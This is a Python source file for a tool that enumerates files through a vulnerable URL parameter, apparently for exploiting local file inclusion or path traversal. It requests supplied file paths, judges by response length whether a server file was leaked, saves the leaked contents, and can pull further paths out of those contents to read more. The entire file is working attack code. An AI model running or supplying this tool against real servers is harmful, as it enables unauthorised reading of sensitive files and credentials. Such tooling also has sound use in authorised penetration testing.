import os
import re
import hashlib
import requests
from datetime import datetime


class FileModeRunner:
    def __init__(self, base_url, param, paths, output_dir="results/filemode", smart_sweep=False, timeout=8):
        self.base_url = base_url.rstrip("/")
        self.param = param
        self.paths = paths
        self.output_dir = output_dir
        self.smart_sweep = smart_sweep
        self.timeout = timeout

        os.makedirs(self.output_dir, exist_ok=True)

    # ---------------------------
    # Core Request Function
    # ---------------------------
    def fetch(self, path):
        try:
            r = requests.get(
                self.base_url,
                params={self.param: path},
                timeout=self.timeout
            )
            return r
        except Exception as e:
            print(f"[!] Error requesting {path}: {e}")
            return None

    # ---------------------------
    # Response Classification
    # ---------------------------
    def classify(self, response, baseline_len):
        if response is None:
            return "ERROR"

        length = len(response.text)

        if response.status_code == 200:
            if length > baseline_len + 50:
                return "VALID_READ"
            elif length > baseline_len + 5:
                return "PARTIAL_READ"
            else:
                return "INVALID"
        elif response.status_code in (401, 403):
            return "BLOCKED"
        else:
            return "INVALID"

    # ---------------------------
    # Save Successful Reads
    # ---------------------------
    def save_result(self, path, content):
        safe_name = re.sub(r'[^a-zA-Z0-9_\-]', '_', path)
        filename = os.path.join(self.output_dir, f"{safe_name}.txt")

        sha = hashlib.sha256(content.encode(errors="ignore")).hexdigest()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        with open(filename, "w", encoding="utf-8", errors="ignore") as f:
            f.write(f"[Path]: {path}\n")
            f.write(f"[Timestamp]: {timestamp}\n")
            f.write(f"[SHA256]: {sha}\n\n")
            f.write(content)

        print(f"    └─ Saved to: {filename}")

    # ---------------------------
    # Smart Directory Sweep
    # ---------------------------
    def extract_paths(self, content):
        found = set()
        for match in re.findall(r'(/[a-zA-Z0-9_\-./]+)', content):
            if len(match) > 1:
                found.add(match)
        return found

    # ---------------------------
    # Main Runner
    # ---------------------------
    def run(self):
        print("\n[+] Starting File Mode Enumeration...\n")

        # Baseline request
        baseline = self.fetch("this_path_should_not_exist_123456")
        baseline_len = len(baseline.text) if baseline else 0
        print(f"[i] Baseline length: {baseline_len}")

        queue = list(self.paths)
        seen = set()

        while queue:
            path = queue.pop(0)
            if path in seen:
                continue
            seen.add(path)

            print(f"[>] Testing: {path}")
            response = self.fetch(path)
            classification = self.classify(response, baseline_len)
            print(f"    └─ Classification: {classification}")

            if classification in ("VALID_READ", "PARTIAL_READ") and response is not None:
                self.save_result(path, response.text)

                if self.smart_sweep:
                    new_paths = self.extract_paths(response.text)
                    for p in new_paths:
                        if p not in seen:
                            print(f"    └─ Discovered path: {p}")
                            queue.append(p)

        print("\n[+] File Mode Complete.\n")

